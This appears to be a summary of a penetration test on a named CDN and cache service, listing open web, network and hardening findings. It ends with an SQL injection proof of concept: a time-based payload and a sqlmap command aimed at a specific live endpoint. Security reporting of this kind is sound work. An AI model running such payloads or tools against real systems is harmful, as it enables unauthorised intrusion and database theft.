# 🌐 Ewano Cache (MCI) — Comprehensive Security Assessment

**Client:** Ewano Co. / MCI — CDN and cache infrastructure (ewano.mci.ir)  
**Assessment Type:** Re-Penetration Test (Web + Network) + CIS Ubuntu 20.04 Hardening  
**Standards:** OWASP WSTG · PTES · CIS Ubuntu 20.04 · CVSSv3.1

---

## Three-Phase Assessment

### Phase 1 — Web Application Re-Pentest

| ID | Vulnerability | CVSS | Severity |
|---|---|:---:|:---:|
| EWC-W-001 | **Admin Panel Exposed to Internet — No MFA** | 9.8 | 🔴 Critical |
| EWC-W-002 | **Stored XSS in Content Management** | 9.0 | 🔴 Critical |
| EWC-W-003 | IDOR — Horizontal Privilege Escalation | 8.5 | 🟠 High |
| EWC-W-004 | **SQL Injection (Time-Based Blind)** | 8.3 | 🟠 High |
| EWC-W-005 | Reflected XSS in Error Pages | 7.4 | 🟠 High |
| EWC-W-006 | CSRF on State-Changing Operations | 7.1 | 🟠 High |
| EWC-W-007 | Weak Password Policy | 6.5 | 🟡 Medium |
| EWC-W-008 | Session Not Invalidated After Password Change | 6.3 | 🟡 Medium |
| EWC-W-009 | Verbose Error Messages / Stack Trace Leakage | 5.3 | 🟡 Medium |
| EWC-W-010 | Missing Security Headers (CSP, HSTS, X-Frame-Options) | 4.3 | 🟡 Medium |

**Remediation progress vs previous test:** 6 findings fixed ✅ · 10 remaining ❌

---

### Phase 2 — Network Re-Pentest (10 hosts)

| ID | Finding | CVSS | Status |
|---|---|:---:|:---:|
| EWC-N-001 | SSH Weak Ciphers/KEX (arcfour, 3DES, DH-group1-sha1) | 7.4 | ❌ Open |
| EWC-N-002 | Exposed Memcached (unauthenticated) + MySQL on network | 5.9 | ❌ Open |
| EWC-N-003 | TLS Certificate Expiry (38 days at assessment) | 3.1 | ❌ Open |

**Fixed since previous test:** Telnet · Anonymous FTP · SSLv3/TLS1.0 · Default SNMP strings · Unauthenticated Redis ✅

---

### Phase 3 — CIS Ubuntu 20.04 Hardening (368 controls)

| Result | Count | % |
|---|:---:|:---:|
| ✅ PASSED | 280 | 76.1% |
| ❌ FAILED | 41 | 11.1% |
| ⚠️ WARNING | 47 | 12.8% |

**Highest-impact failures:** No host firewall (ufw) · No file integrity monitoring (AIDE) · auditd not installed · IP forwarding enabled · /tmp not mounted noexec/nosuid · Password hashing using MD5 (not SHA-512) · World-writable files present · SSH logging insufficient

Full command-level remediation provided for all 41 failures.

---

## SQLi Proof of Concept

```bash
# Time-based blind injection confirmed:
GET /api/cache/search?q=test' AND SLEEP(5)-- -
# Response time: ~5,021ms (baseline: ~140ms)

# Automated extraction:
sqlmap -u "https://ewano.mci.ir/api/cache/search?q=test" \
  --cookie="session=..." --dbs --level=2 --risk=2
```

---

📄 **[→ View Full Report with Evidence Screenshots](./report.html)**
